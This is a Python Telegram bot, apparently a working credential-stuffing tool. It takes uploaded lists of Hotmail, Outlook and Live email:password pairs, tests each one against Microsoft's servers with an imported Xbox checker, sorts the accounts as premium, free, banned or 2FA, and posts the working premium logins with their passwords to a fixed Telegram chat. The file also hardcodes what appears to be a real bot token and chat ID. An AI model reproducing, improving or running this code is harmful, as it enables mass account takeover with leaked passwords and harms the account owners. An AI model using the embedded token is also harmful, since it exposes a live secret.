import os
import sys
import time
import threading
import queue
import asyncio
import tempfile
import shutil
import traceback
from datetime import datetime
from pathlib import Path

from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
from telegram.constants import ParseMode

# Import your original checker
import checker

# Telegram Configuration
BOT_TOKEN = "8657130802:AAE8Ynf791ramxyFktFPHgwuv0b5vNKiKH0"
CHAT_ID = 8260250818

# Allowed Microsoft domains
ALLOWED_DOMAINS = [
    'hotmail.com', 'hotmail.co.uk', 'hotmail.fr', 'hotmail.de',
    'outlook.com', 'outlook.co.uk', 'outlook.fr', 'outlook.de',
    'live.com', 'live.co.uk', 'live.fr', 'live.de',
    'msn.com', 'passport.com'
]

# Global variables
task_queue = queue.Queue()
processing_active = False
current_task = None
cancel_flag = False
processing_lock = threading.Lock()
loop = None

class ScanTask:
    def __init__(self, file_path, original_name, file_id, chat_id):
        self.file_path = file_path
        self.original_name = original_name
        self.file_id = file_id
        self.chat_id = chat_id
        self.created_at = datetime.now()
        self.completed_at = None

def validate_microsoft_domain(email):
    """Check if email is from Microsoft domain"""
    try:
        domain = email.split('@')[-1].lower().strip()
        for allowed in ALLOWED_DOMAINS:
            if domain == allowed:
                return True
        return False
    except:
        return False

def validate_and_filter_file(file_path):
    """Filter file to only Microsoft domain emails"""
    try:
        with open(file_path, 'r', encoding='utf-8') as f:
            lines = f.readlines()
        
        valid_lines = []
        invalid_count = 0
        invalid_examples = []
        
        for line in lines:
            line = line.strip()
            if not line or ':' not in line:
                continue
            
            email = line.split(':', 1)[0].strip()
            
            if validate_microsoft_domain(email):
                valid_lines.append(line)
            else:
                invalid_count += 1
                if len(invalid_examples) < 3:
                    invalid_examples.append(email)
        
        if not valid_lines:
            return None, 0, invalid_count, invalid_examples
        
        # Create filtered file
        filtered_dir = tempfile.mkdtemp()
        filtered_path = os.path.join(filtered_dir, 'filtered_' + os.path.basename(file_path))
        
        with open(filtered_path, 'w', encoding='utf-8') as f:
            f.write('\n'.join(valid_lines))
        
        return filtered_path, len(valid_lines), invalid_count, invalid_examples
        
    except Exception as e:
        return None, 0, 0, []

def run_real_checker_on_file(file_path, status_callback, cancel_check_callback):
    """
    Run YOUR ACTUAL XboxChecker on every account in the file
    This is REAL validation - not fake counting
    """
    try:
        # Read accounts
        with open(file_path, 'r', encoding='utf-8') as f:
            lines = [l.strip() for l in f.readlines() if l.strip() and ':' in l]
        
        if not lines:
            return {"status": "error", "error": "No valid accounts in file"}
        
        # Statistics
        stats = {
            "total": len(lines),
            "checked": 0,
            "premium": 0,
            "free": 0,
            "bad": 0,
            "expired": 0,
            "banned": 0,
            "two_factor": 0,
            "timeout": 0,
            "error": 0
        }
        
        premium_results = []
        
        # Process each account with YOUR original checker
        for idx, line in enumerate(lines, 1):
            # Check cancellation
            if cancel_check_callback and cancel_check_callback():
                status_callback("🛑 Scan cancelled by user")
                return {"status": "cancelled", "stats": stats}
            
            try:
                email, password = line.split(':', 1)
                email = email.strip()
                password = password.strip()
                
                # Send real-time status
                status_callback(f"[{idx}/{stats['total']}] 🔍 Checking: {email}")
                
                # CREATE YOUR XBOX CHECKER INSTANCE
                xbox_checker = checker.XboxChecker(debug=False)
                
                # RUN THE ACTUAL CHECK
                result = xbox_checker.check(email, password)
                status = result['status']
                data = result.get('data', {})
                
                # Update stats based on REAL result
                if status == "PREMIUM":
                    stats["premium"] += 1
                    premium_results.append((email, password, data))
                    status_callback(f"[{idx}/{stats['total']}] ✅ PREMIUM! {email} - {data.get('premium_type', 'GAME PASS')} | {data.get('days_remaining', '0')} days left")
                    
                    # Send premium hit immediately
                    try:
                        telegram_sender = checker.TelegramSender()
                        msg = telegram_sender.format_hit_message(email, password, data)
                        telegram_sender.send_message(msg)
                    except:
                        pass
                        
                elif status == "FREE":
                    stats["free"] += 1
                    status_callback(f"[{idx}/{stats['total']}] 🆓 FREE ACCOUNT: {email}")
                    
                elif status == "EXPIRED":
                    stats["expired"] += 1
                    stats["bad"] += 1
                    status_callback(f"[{idx}/{stats['total']}] ⏰ EXPIRED: {email}")
                    
                elif status == "BANNED":
                    stats["banned"] += 1
                    stats["bad"] += 1
                    status_callback(f"[{idx}/{stats['total']}] 🚫 BANNED: {email}")
                    
                elif status == "2FACTOR":
                    stats["two_factor"] += 1
                    stats["bad"] += 1
                    status_callback(f"[{idx}/{stats['total']}] 🔐 2FA REQUIRED: {email}")
                    
                elif status == "TIMEOUT":
                    stats["timeout"] += 1
                    stats["bad"] += 1
                    status_callback(f"[{idx}/{stats['total']}] ⏱️ TIMEOUT: {email}")
                    
                elif status == "ERROR":
                    stats["error"] += 1
                    stats["bad"] += 1
                    status_callback(f"[{idx}/{stats['total']}] ⚠️ ERROR: {email}")
                    
                else:  # BAD
                    stats["bad"] += 1
                    status_callback(f"[{idx}/{stats['total']}] ❌ BAD CREDENTIALS: {email}")
                
                stats["checked"] += 1
                
                # Small delay to avoid rate limiting
                time.sleep(0.2)
                
            except Exception as e:
                stats["error"] += 1
                stats["bad"] += 1
                stats["checked"] += 1
                status_callback(f"[{idx}/{stats['total']}] ⚠️ ERROR: {str(e)[:50]}")
        
        # Build results text for premium accounts
        premium_text = ""
        for email, password, data in premium_results:
            premium_text += f"{email}:{password} | {data.get('premium_type', 'UNKNOWN')} | {data.get('days_remaining', '0')} days\n"
        
        return {
            "status": "success",
            "stats": stats,
            "premium_text": premium_text
        }
        
    except Exception as e:
        return {"status": "error", "error": str(e), "traceback": traceback.format_exc()}

def process_queue():
    """Process tasks from queue sequentially"""
    global processing_active, current_task, cancel_flag
    
    while True:
        try:
            if task_queue.empty():
                with processing_lock:
                    processing_active = False
                    current_task = None
                time.sleep(1)
                continue
            
            with processing_lock:
                current_task = task_queue.get()
                processing_active = True
                cancel_flag = False
            
            # Send start message
            asyncio.run_coroutine_threadsafe(
                send_processing_start(current_task),
                loop
            )
            
            # Status callback
            def status_callback(message):
                asyncio.run_coroutine_threadsafe(
                    send_status_update(current_task, message),
                    loop
                )
            
            # Cancel check
            def cancel_check():
                return cancel_flag
            
            # RUN REAL CHECKER
            result = run_real_checker_on_file(current_task.file_path, status_callback, cancel_check)
            
            if result.get("status") == "success":
                # Send final results
                asyncio.run_coroutine_threadsafe(
                    send_final_results(current_task, result["stats"], result["premium_text"]),
                    loop
                )
            elif result.get("status") == "cancelled":
                asyncio.run_coroutine_threadsafe(
                    send_cancelled_message(current_task),
                    loop
                )
            else:
                asyncio.run_coroutine_threadsafe(
                    send_error_message(current_task, result.get("error", "Unknown error")),
                    loop
                )
            
            # Cleanup
            if current_task.file_path and os.path.exists(current_task.file_path):
                try:
                    shutil.rmtree(os.path.dirname(current_task.file_path))
                except:
                    pass
            
            task_queue.task_done()
            
        except Exception as e:
            if current_task:
                asyncio.run_coroutine_threadsafe(
                    send_error_message(current_task, str(e)),
                    loop
                )
                task_queue.task_done()
            time.sleep(1)

async def send_processing_start(task):
    message = (
        f"🚀 **XBOX CHECKER ACTIVE**\n\n"
        f"📄 **File:** `{task.original_name}`\n"
        f"⏰ **Started:** {task.created_at.strftime('%Y-%m-%d %H:%M:%S')}\n\n"
        f"🔄 **Real validation in progress...**\n"
        f"⏳ Each account is being checked LIVE with Microsoft servers."
    )
    await app.bot.send_message(chat_id=CHAT_ID, text=message, parse_mode=ParseMode.MARKDOWN)

async def send_status_update(task, message):
    try:
        await app.bot.send_message(
            chat_id=CHAT_ID,
            text=f"📡 {message}",
            parse_mode=ParseMode.MARKDOWN
        )
    except:
        pass

async def send_final_results(task, stats, premium_text):
    receipt = (
        f"✅ **SCAN COMPLETE**\n\n"
        f"📄 **File:** `{task.original_name}`\n"
        f"⏱️ **Duration:** {(datetime.now() - task.created_at).total_seconds():.1f} seconds\n\n"
        f"📊 **FINAL RESULTS**\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🔢 **Total:** `{stats['total']}`\n"
        f"✅ **PREMIUM HITS:** `{stats['premium']}`\n"
        f"🆓 **FREE:** `{stats['free']}`\n"
        f"❌ **BAD:** `{stats['bad']}`\n"
        f"⏰ **EXPIRED:** `{stats['expired']}`\n"
        f"🚫 **BANNED:** `{stats['banned']}`\n"
        f"🔐 **2FA:** `{stats['two_factor']}`\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
    )
    
    await app.bot.send_message(chat_id=CHAT_ID, text=receipt, parse_mode=ParseMode.MARKDOWN)
    
    if stats['premium'] > 0 and premium_text:
        premium_msg = f"🎮 **PREMIUM ACCOUNTS ({stats['premium']})**\n\n"
        premium_msg += f"```\n{premium_text[:4000]}\n```"
        await app.bot.send_message(chat_id=CHAT_ID, text=premium_msg, parse_mode=ParseMode.MARKDOWN)
    
    remaining = task_queue.qsize()
    if remaining > 0:
        await app.bot.send_message(
            chat_id=CHAT_ID,
            text=f"📁 **Next file in queue:** {remaining} file(s) waiting.\n⏳ Processing next...",
            parse_mode=ParseMode.MARKDOWN
        )

async def send_error_message(task, error):
    message = f"❌ **ERROR**\n\n📄 `{task.original_name}`\n`{error[:500]}`"
    await app.bot.send_message(chat_id=CHAT_ID, text=message, parse_mode=ParseMode.MARKDOWN)

async def send_cancelled_message(task):
    message = f"🛑 **CANCELLED**\n\n📄 `{task.original_name}`\nStopped by user."
    await app.bot.send_message(chat_id=CHAT_ID, text=message, parse_mode=ParseMode.MARKDOWN)

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    welcome = (
        "🎮 **XBOX PREMIUM CHECKER BOT**\n\n"
        "Send a `.txt` file with accounts in `email:password` format\n\n"
        "**Allowed domains:**\n"
        "hotmail.com, outlook.com, live.com, msn.com\n\n"
        "**Commands:**\n"
        "/start - This message\n"
        "/status - Queue status\n"
        "/cancel - Stop current scan"
    )
    await update.message.reply_text(welcome, parse_mode=ParseMode.MARKDOWN)

async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    with processing_lock:
        queue_size = task_queue.qsize()
        is_processing = processing_active
    
    if is_processing and current_task:
        msg = f"📊 **Active Scan:** `{current_task.original_name}`\n⏳ **Queue:** {queue_size} file(s)\n\nUse /cancel to stop."
    else:
        msg = f"📊 **Idle**\n⏳ **Queue:** {queue_size} file(s)\n\nSend a .txt file to start."
    
    await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN)

async def cancel_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global cancel_flag
    
    with processing_lock:
        if processing_active and current_task:
            cancel_flag = True
            msg = f"🛑 Cancelling scan for `{current_task.original_name}`...\nWill stop after current account."
            await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN)
        else:
            await update.message.reply_text("No active scan to cancel.")

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    document = update.message.document
    
    if not document.file_name.endswith('.txt'):
        await update.message.reply_text("❌ Please send a `.txt` file.")
        return
    
    # Download file
    file = await context.bot.get_file(document.file_id)
    temp_dir = tempfile.mkdtemp()
    temp_path = os.path.join(temp_dir, document.file_name)
    await file.download_to_drive(temp_path)
    
    # Validate and filter
    filtered_path, valid_count, invalid_count, invalid_examples = validate_and_filter_file(temp_path)
    
    if filtered_path is None:
        await update.message.reply_text(
            f"❌ **File Rejected**\n\nNo Microsoft accounts found.\n\nAllowed: hotmail.com, outlook.com, live.com, msn.com",
            parse_mode=ParseMode.MARKDOWN
        )
        shutil.rmtree(temp_dir)
        return
    
    warning = f"\n⚠️ Skipped {invalid_count} non-Microsoft account(s)" if invalid_count > 0 else ""
    
    # Create task
    task = ScanTask(
        file_path=filtered_path,
        original_name=document.file_name,
        file_id=document.file_id,
        chat_id=update.effective_chat.id
    )
    
    task_queue.put(task)
    queue_size = task_queue.qsize()
    
    await update.message.reply_text(
        f"✅ **File Accepted**\n\n"
        f"📄 `{document.file_name}`\n"
        f"🔢 **Valid accounts:** `{valid_count}`{warning}\n"
        f"📊 **Queue position:** `{queue_size}`\n\n"
        f"🔄 Starting REAL Xbox validation...\n"
        f"Use /status to track progress.",
        parse_mode=ParseMode.MARKDOWN
    )
    
    # Start processing if not running
    with processing_lock:
        if not processing_active:
            thread = threading.Thread(target=process_queue, daemon=True)
            thread.start()

def main():
    global app, loop
    
    app = Application.builder().token(BOT_TOKEN).build()
    loop = asyncio.get_event_loop()
    
    app.add_handler(CommandHandler("start", start_command))
    app.add_handler(CommandHandler("status", status_command))
    app.add_handler(CommandHandler("cancel", cancel_command))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    
    print("🤖 Xbox Checker Bot Running...")
    print(f"Bot Token: {BOT_TOKEN[:10]}...")
    print("Waiting for .txt files...")
    
    app.run_polling()

if __name__ == "__main__":
    main()
